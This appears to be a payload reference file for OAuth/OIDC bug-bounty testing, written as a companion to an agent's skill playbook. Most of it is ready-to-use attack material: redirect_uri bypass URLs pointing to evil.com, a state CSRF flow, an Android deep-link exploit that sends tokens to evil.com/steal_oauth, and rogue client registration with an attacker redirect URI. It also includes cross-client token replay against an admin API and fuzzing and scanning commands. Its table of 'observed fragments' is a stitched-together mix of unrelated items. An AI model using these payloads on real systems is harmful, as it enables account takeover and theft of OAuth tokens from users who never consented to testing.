# OAuth OIDC — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `redirect_uri=https://target.com.evil.com` `redirect_uri=https://target.com%2f@evil.com`

- `redirect_uri=https://target.com/callback/../../evil`

- `response_type=token` `scope=openid profile email`

- `state=` empty/reused; `nonce=` missing



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 5× | `Curl_auth_allowed_to_host()` |

| 4× | `wp_redirect()` |

| 4× | `Curl_auth_allowed_to_origin()` |

| 4× | `data->state.creds` |

| 3× | `$count = 1` |

| 3× | `conn->bits.netrc` |

| 3× | `support+1@trint.com` |

| 3× | `@rpath` |

| 3× | `url_set_data_creds_netrc()` |

| 2× | `ngalog+1@wearehackerone.com` |

| 2× | `https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>` |

| 2× | `GET → 404 {"status":404,"error":"Not Found"}` |

| 2× | `https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect` |

| 2× | `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` |

| 2× | `str_replace()` |

| 2× | `wp_safe_redirect()` |

| 2× | `get_target_url()` |

| 2× | `wp_sanitize_redirect()` |

| 2× | `wp_validate_redirect()` |

| 2× | `GET / HTTP/1.1 / Host: hostname.tld:9999 / User-Agent: curl/7.83.0-DEV / Accept: */* / Authorization: secrettoken / Cookie: secretcookie` |



## Parameters observed



`client_id` · `redirect_uri` · `response_type` · `scope` · `code` · `state` · `oauth_token` · `referrer` · `client_secret` · `error` · `type` · `email` · `remember_me` · `ticket` · `jwt` · `next` · `settings_version` · `callback` · `requestTokenAndRedirect` · `sid`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_oauth-oidc.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_oauth-oidc.txt` | 78 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_oauth-oidc.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_oauth-oidc.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Focus on redirect_uri validation, state/nonce, code reuse, and account linking — scanner coverage is shallow.



```sh

nuclei -u https://target -tags oauth,oidc \

       -severity low,medium,high,critical -rl 40 -o nuclei_oauth-oidc.txt

nuclei -u https://target -t ~/nuclei-templates/http/technologies/oauth2-detect.yaml \

       -rl 40 -o nuclei_oauth-oidc_oauth2-detect.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



### redirect_uri Bypass Payloads

```

# Host confusion

https://evil.com#legit.com

https://legit.com.evil.com

https://legit.com@evil.com



# Path traversal

https://legit.com/oauth/callback/../../redirect?url=https://evil.com



# Open redirect chain (find open redirect on legit domain first)

https://legit.com/logout?next=https://evil.com



# Parameter pollution

?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb



# URL encoded slashes

https://legit.com%2F@evil.com

https://legit.com%252F..%252F..evil.com

```



### State CSRF Test

```bash

# Step 1: Initiate OAuth flow, capture state value

# Step 2: Drop request, use attacker account's link with victim's session

curl -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=FIXED_VALUE"



# Step 3: Force victim to visit callback with attacker's code + fixed state

https://target.com/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE

```



### Nonce Extraction via Referrer

```bash

# After OAuth callback landing page, check outbound requests

# Look for Referer header containing access_token or code

curl -v "https://target.com/auth/callback?code=ABC&state=XYZ" \

  -H "Referer: https://evil.com" \

  --max-redirs 0



# Grep JS for outbound calls made on callback page

grep -r "fetch\|XMLHttpRequest\|img.src\|script.src" callback_page.html

```



### Mobile Deep Link Exploit (Android)

```bash

# ADB exploit for push_notification_webview deeplink

adb shell am start -a android.intent.action.VIEW \

  -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"



# Craft intent URI for web-based exploit

<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>

```



### Token Endpoint Auth Bypass

```bash

# Test unauthenticated token exchange (skip email verification)

curl -X POST https://target.com/oauth/token \

  -d "grant_type=authorization_code" \

  -d "code=CAPTURED_CODE" \

  -d "client_id=CLIENT_ID" \

  -d "redirect_uri=https://legit.com/callback"



# Test with unverified account credentials

curl -X POST https://target.com/oauth/token \

  -d "grant_type=password" \

  -d "username=unverified@evil.com" \

  -d "password=password123" \

  -d "client_id=CLIENT_ID"

```



### Grep Patterns for Recon

```bash

# In APK/JS files

grep -r "redirect_uri\|client_secret\|oauth_token\|access_token\|push_notification" .

grep -r "intent://\|deeplink\|scheme://" .



# In Burp history

# Filter: URL contains "oauth" OR "token" OR "callback"

# Filter: Response contains "access_token" OR "code=" in Location header



# Check .well-known

curl https://target.com/.well-known/openid-configuration | python3 -m json.tool

```



### OIDC Discovery & Dynamic Registration Abuse

```bash

# Enumerate OIDC endpoints (esp. registration_endpoint)

curl -s https://idp/.well-known/openid-configuration | jq '{authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint, response_types_supported}'



# If registration_endpoint is open, register a malicious client with attacker redirect_uri

curl -X POST https://idp/connect/register \

  -H "Content-Type: application/json" \

  -d '{"client_name":"legit-app","redirect_uris":["https://attacker/cb"]}'

```



### Cross-Client Token Confusion

```bash

# Mint token for client A, attempt replay on client B's API

TOKEN=$(curl -s https://idp/oauth/token \

  -d "code=$AUTH_CODE&client_id=CLIENT_A&client_secret=SECRET_A&redirect_uri=https://app-a.com/cb" | jq -r .access_token)



# Test if client B's API accepts the token (no audience validation)

curl https://api.app-b.com/admin -H "Authorization: Bearer $TOKEN"

```



### OIDC prompt=none Silent Re-Auth Test

```bash

# Test whether adding prompt=none to authorize request yields a token without user interaction

# Signals session fixation / silent auth abuse potential

curl -v "https://idp/authorize?client_id=APP&redirect_uri=https://app/cb&response_type=code&state=XYZ&prompt=none"

```



---
